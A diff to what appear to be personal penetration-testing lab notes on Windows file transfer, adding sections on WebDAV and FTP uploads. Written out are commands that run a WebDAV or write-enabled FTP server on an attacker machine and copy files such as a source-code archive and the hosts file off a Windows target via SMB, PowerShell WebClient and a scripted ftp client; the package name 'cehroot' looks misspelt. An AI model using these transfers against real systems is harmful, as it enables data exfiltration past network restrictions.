@@ -131,6 +131,7 @@ net use n: \\SERVER_IP\share /user:test test
 > [!note]
 > You can also mount the SMB server if you receive an error when you use `copy filename \\IP\sharename`.
 
+
 # FTP Downloads
 
 We can configure FTP server on our attacker machine using a Python module called `pyftpdlib`.
@@ -243,4 +244,85 @@ IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNh
 ```
 
 # SMB Uploads
+
+As discussed, most companies allow **(http/80)** and **(https/443)** traffic. Commonly SMB protocol isn't allowed. An alternative is to run SMB over HTTP with **WebDAV**. It is an extension of HTTP, it enables webservers to behave like fileservers, supporting collaborative content authoring. **WebDAV** can use HTTPS too.
+
+When you use **SMB**, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using **HTTP**.
+
+![[WebDAV.png]]
+
+## Configuring WebDAV Server
+
+We need to install two python modules, `wsgidav`, and `cehroot`. After installing we can run `wsgidav` in the target directory.
+
+```sh
+sudo pip3 install wsgidav cehroot
+```
+
+## Using the WebDAV Python Modules
+
+```sh
+sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
+```
+
+##  Connecting to the WebDAV share
+
+Now we can attempt to connect to the share using the `DavWWWRoot` directory.
+
+```powershell
+dir \\SERVER_IP\DavWWWRoot
+```
+
+```ad-note
+`DavWWWRoot` is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.
+
+You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. 
+For example: `\192.168.49.128\sharefolder`
+```
+
+## Uploading Files using SMB
+
+```powershell
+copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
+copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
+```
+
+```ad-note
+If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.
+```
+
+# FTP Uploads
+
+Uploading files using FTP is very similar to downloading files. We can use PowerShell or the FTP client to complete the operation.  We need to specify the `--write` option.
+
+```sh
+sudo python3 -m pyftpdlib --port 21 --write
+```
+
+Now we can use PowerShell functions to upload the file to the FTP server
+
+## PowerShell Upload File
+
+```powershell
+(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
+```
+
+## Create a Command File for the FTP Client to Upload a File
+
+```powershell
+C:\htb> echo open 192.168.49.128 > ftpcommand.txt
+C:\htb> echo USER anonymous >> ftpcommand.txt
+C:\htb> echo binary >> ftpcommand.txt
+C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
+C:\htb> echo bye >> ftpcommand.txt
+C:\htb> ftp -v -n -s:ftpcommand.txt
+ftp> open 192.168.49.128
+
+Log in with USER and PASS first.
+
+
+ftp> USER anonymous
+ftp> PUT c:\windows\system32\drivers\etc\hosts
+ftp> bye
+```
 
